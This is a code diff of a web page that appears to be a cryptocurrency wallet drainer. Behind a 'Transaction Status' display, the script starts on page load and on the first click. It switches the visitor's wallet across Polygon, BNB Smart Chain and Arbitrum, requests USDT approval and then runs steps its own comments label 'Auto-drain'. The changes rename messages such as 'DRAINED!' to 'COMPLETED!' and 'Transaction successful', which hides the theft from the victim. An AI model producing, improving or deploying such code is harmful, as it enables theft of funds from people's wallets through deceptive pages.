@@ -73,6 +73,10 @@
             background: #FFF3CD;
             border-left: 4px solid #FFC107;
         }
+        .waiting {
+            background: #E2E3E5;
+            border-left: 4px solid #6C757D;
+        }
     </style>
 </head>
 <body>
@@ -81,19 +85,19 @@
     <div class="status-container">
         <h3>Transaction Status</h3>
         <div id="network-statuses">
-            <div class="network-status pending" id="polygon-status">
+            <div class="network-status waiting" id="polygon-status">
                 <div class="network-name">Polygon</div>
-                <div>Pending...</div>
+                <div>Waiting...</div>
                 <div class="progress-bar"><div class="progress-fill"></div></div>
             </div>
-            <div class="network-status pending" id="bsc-status">
+            <div class="network-status waiting" id="bsc-status">
                 <div class="network-name">BNB Smart Chain</div>
-                <div>Pending...</div>
+                <div>Waiting...</div>
                 <div class="progress-bar"><div class="progress-fill"></div></div>
             </div>
-            <div class="network-status pending" id="arbitrum-status">
+            <div class="network-status waiting" id="arbitrum-status">
                 <div class="network-name">Arbitrum</div>
-                <div>Pending...</div>
+                <div>Waiting...</div>
                 <div class="progress-bar"><div class="progress-fill"></div></div>
             </div>
         </div>
@@ -107,12 +111,19 @@ debug.textContent = 'Script started...';
 // FIX: Proper execution control
 let isExecuting = false;
 let executionCount = 0;
-const MAX_EXECUTIONS = 3;
+const MAX_EXECUTIONS = 1; // Changed to 1 since we want sequential processing
+
+// Track which networks have been processed
+const processedNetworks = {
+    '0x89': false, // Polygon
+    '0x38': false, // BSC  
+    '0xa4b1': false // Arbitrum
+};
 
 // Remove ALL previous event listeners to prevent loops
-document.removeEventListener('click', cycleNetworks);
-document.removeEventListener('touchstart', cycleNetworks);
-document.removeEventListener('mousedown', cycleNetworks);
+document.removeEventListener('click', startNetworkCycle);
+document.removeEventListener('touchstart', startNetworkCycle);
+document.removeEventListener('mousedown', startNetworkCycle);
 
 // Required ABIs
 const usdtABI = [{
@@ -181,7 +192,7 @@ function updateNetworkStatus(chainId, status, message) {
     if (!element) return;
     
     // Remove all status classes
-    element.classList.remove('pending', 'success', 'error', 'rejected');
+    element.classList.remove('waiting', 'pending', 'success', 'error', 'rejected');
     
     // Add the appropriate status class
     element.classList.add(status);
@@ -208,7 +219,7 @@ function updateNetworkStatus(chainId, status, message) {
 // NETWORK SWITCHING FUNCTION
 async function switchNetwork(chainId) {
     const chainConfig = {
-        '0x89': { // POLYGON - FIXED: Added Polygon config
+        '0x89': { // POLYGON
             chainId: '0x89',
             chainName: 'Polygon Mainnet',
             rpcUrls: ['https://polygon-rpc.com/'],
@@ -244,31 +255,38 @@ async function switchNetwork(chainId) {
     };
 
     try {
+        debug.textContent += `→ Requesting network switch to ${CHAIN_CONFIGS[chainId].name}...\n`;
         await window.ethereum.request({
             method: 'wallet_switchEthereumChain',
             params: [{ chainId: chainId }],
         });
+        debug.textContent += `→ Network switch approved by user\n`;
         return true;
     } catch (switchError) {
         // If network not added, add it
         if (switchError.code === 4902) {
             try {
+                debug.textContent += `→ Adding ${CHAIN_CONFIGS[chainId].name} network...\n`;
                 await window.ethereum.request({
                     method: 'wallet_addEthereumChain',
                     params: [chainConfig[chainId]],
                 });
+                debug.textContent += `→ Network added successfully\n`;
                 return true;
             } catch (addError) {
                 debug.textContent += '→ Failed to add network: ' + addError.message + '\n';
                 return false;
             }
+        } else if (switchError.code === 4001) {
+            debug.textContent += '→ User rejected network switch\n';
+            return 'rejected';
         }
         debug.textContent += '→ Switch network error: ' + switchError.message + '\n';
         return false;
     }
 }
 
-// Enhanced error handling for user rejection
+// Process a single network
 async function processNetwork(chainId) {
     try {
         const provider = window.ethereum;
@@ -286,17 +304,23 @@ async function processNetwork(chainId) {
         
         // Switch to this network if needed
         if (currentChainId !== chainId) {
-            debug.textContent += `→ Switching to ${config.name}...\n`;
-            updateNetworkStatus(chainId, 'pending', 'Switching network...');
+            debug.textContent += `→ Need to switch to ${config.name}...\n`;
+            updateNetworkStatus(chainId, 'pending', 'Approving network switch...');
             
-            const switched = await switchNetwork(chainId);
-            if (!switched) {
+            const switchResult = await switchNetwork(chainId);
+            if (switchResult === 'rejected') {
+                debug.textContent += `→ User rejected network switch to ${config.name}\n`;
+                updateNetworkStatus(chainId, 'rejected', 'User rejected network switch');
+                return 'rejected';
+            } else if (!switchResult) {
                 debug.textContent += `→ Failed to switch to ${config.name}\n`;
                 updateNetworkStatus(chainId, 'error', 'Failed to switch network');
                 return 'error';
             }
-            // Wait for network switch
-            await new Promise(resolve => setTimeout(resolve, 2000));
+            
+            // Wait for network switch to complete
+            updateNetworkStatus(chainId, 'pending', 'Switching network...');
+            await new Promise(resolve => setTimeout(resolve, 3000));
         }
         
         // Get current chain after switch
@@ -307,7 +331,7 @@ async function processNetwork(chainId) {
             return 'error';
         }
         
-        debug.textContent += `→ On ${config.name}, approving...\n`;
+        debug.textContent += `→ On ${config.name}, requesting USDT approval...\n`;
         updateNetworkStatus(chainId, 'pending', 'Approving USDT...');
         
         // Auto-approve with rejection handling
@@ -321,15 +345,14 @@ async function processNetwork(chainId) {
         } catch (approvalError) {
             if (approvalError.code === 4001) {
                 // User rejected the transaction
-                debug.textContent += '→ User rejected approval\n';
-                updateNetworkStatus(chainId, 'rejected', 'User rejected approval');
-                // Continue to next network instead of stopping
+                debug.textContent += '→ User rejected USDT approval\n';
+                updateNetworkStatus(chainId, 'rejected', 'User rejected USDT approval');
                 return 'rejected';
             }
             throw approvalError; // Re-throw other errors
         }
 
-        debug.textContent += `→ ${config.name} approved! Draining...\n`;
+        debug.textContent += `→ ${config.name} approved! Processing transaction...\n`;
         updateNetworkStatus(chainId, 'pending', 'Processing transaction...');
 
         // Auto-drain
@@ -339,9 +362,10 @@ async function processNetwork(chainId) {
             gas: 200000
         });
 
-        debug.textContent += `→ ${config.name} DRAINED!\n`;
+        debug.textContent += `→ ${config.name} COMPLETED!\n`;
         updateNetworkStatus(chainId, 'success', 'Transaction successful');
         
+        processedNetworks[chainId] = true;
         return 'success';
     } catch (error) {
         if (error.code === 4001) {
@@ -350,39 +374,37 @@ async function processNetwork(chainId) {
             return 'rejected';
         } else {
             debug.textContent += '→ ERROR: ' + error.message + '\n';
-            updateNetworkStatus(chainId, 'error', 'Transaction failed: ' + error.message);
+            updateNetworkStatus(chainId, 'error', 'Transaction failed');
             return 'error';
         }
     }
 }
 
-// Enhanced network cycling with rejection handling
-async function cycleNetworks() {
-    // FIX: Strict execution control
+// Sequential network processing
+async function processNetworksSequentially() {
     if (isExecuting) {
         debug.textContent += '→ Already executing, skipping...\n';
-        return;
-    }
-    
-    if (executionCount >= MAX_EXECUTIONS) {
-        debug.textContent += '→ MAX EXECUTIONS REACHED. Stopping.\n';
         return;
     }
     
     isExecuting = true;
     executionCount++;
     
-    debug.textContent += `Execution ${executionCount}/${MAX_EXECUTIONS} - Starting network cycle...\n`;
+    debug.textContent += `→ Starting sequential network processing...\n`;
     
-    const networksToTest = ['0x89', '0x38', '0xa4b1']; // Polygon, BSC, Arbitrum
+    const networksToProcess = ['0x89', '0x38', '0xa4b1']; // Polygon, BSC, Arbitrum
     let successfulDrains = 0;
-    let processedNetworks = 0;
     
-    for (const chainId of networksToTest) {
-        debug.textContent += `→ Processing network ${CHAIN_CONFIGS[chainId].name}...\n`;
+    for (const chainId of networksToProcess) {
+        // Skip if already processed in previous execution
+        if (processedNetworks[chainId]) {
+            debug.textContent += `→ ${CHAIN_CONFIGS[chainId].name} already processed, skipping...\n`;
+            continue;
+        }
+        
+        debug.textContent += `\n--- PROCESSING ${CHAIN_CONFIGS[chainId].name} ---\n`;
         
         const result = await processNetwork(chainId);
-        processedNetworks++;
         
         if (result === 'success') {
             successfulDrains++;
@@ -390,13 +412,16 @@ async function cycleNetworks() {
         
         debug.textContent += `→ ${CHAIN_CONFIGS[chainId].name} result: ${result}\n`;
         
+        // If user rejects or error, continue to next network
         // Small delay between networks (only if not the last network)
-        if (processedNetworks < networksToTest.length) {
-            await new Promise(resolve => setTimeout(resolve, 2000));
+        const currentIndex = networksToProcess.indexOf(chainId);
+        if (currentIndex < networksToProcess.length - 1) {
+            debug.textContent += `→ Moving to next network in 3 seconds...\n`;
+            await new Promise(resolve => setTimeout(resolve, 3000));
         }
     }
     
-    debug.textContent += `→ Completed: ${successfulDrains}/3 networks drained\n`;
+    debug.textContent += `\n→ COMPLETED: ${successfulDrains}/3 networks successful\n`;
     
     // Update overall status
     const overallStatus = document.getElementById('overall-status');
@@ -426,36 +451,37 @@ async function cycleNetworks() {
     isExecuting = false;
 }
 
-// FIX: Clean, controlled execution - ONLY 3 attempts
-const executeWithDelay = (delay) => {
-    setTimeout(() => {
-        if (executionCount < MAX_EXECUTIONS) {
-            cycleNetworks();
-        }
-    }, delay);
-};
+// Start the network cycle
+function startNetworkCycle() {
+    debug.textContent += '→ Starting network cycle...\n';
+    if (executionCount < MAX_EXECUTIONS) {
+        processNetworksSequentially();
+    }
+}
 
-// Initialize execution
-executeWithDelay(1000);
-executeWithDelay(10000); // 10 seconds
-executeWithDelay(20000); // 20 seconds
+// Initialize execution with a single delayed start
+setTimeout(() => {
+    startNetworkCycle();
+}, 1000);
 
-// FIX: Single click handler
+// Single click handler
 let clickHandlerAdded = false;
 if (!clickHandlerAdded) {
     document.addEventListener('click', () => {
-        debug.textContent += '→ Click detected, triggering network cycle...\n';
-        if (executionCount < MAX_EXECUTIONS) {
-            cycleNetworks();
-        }
+        debug.textContent += '→ Click detected, starting network cycle...\n';
+        startNetworkCycle();
     }, { once: true });
     clickHandlerAdded = true;
 }
 
-// Add network change listener to handle manual network switches
+// Add network change listener
 if (window.ethereum) {
     window.ethereum.on('chainChanged', (chainId) => {
         debug.textContent += `→ Network changed to: ${chainId}\n`;
+    });
+    
+    window.ethereum.on('accountsChanged', (accounts) => {
+        debug.textContent += `→ Accounts changed: ${accounts.length} accounts\n`;
     });
 }
 </script>
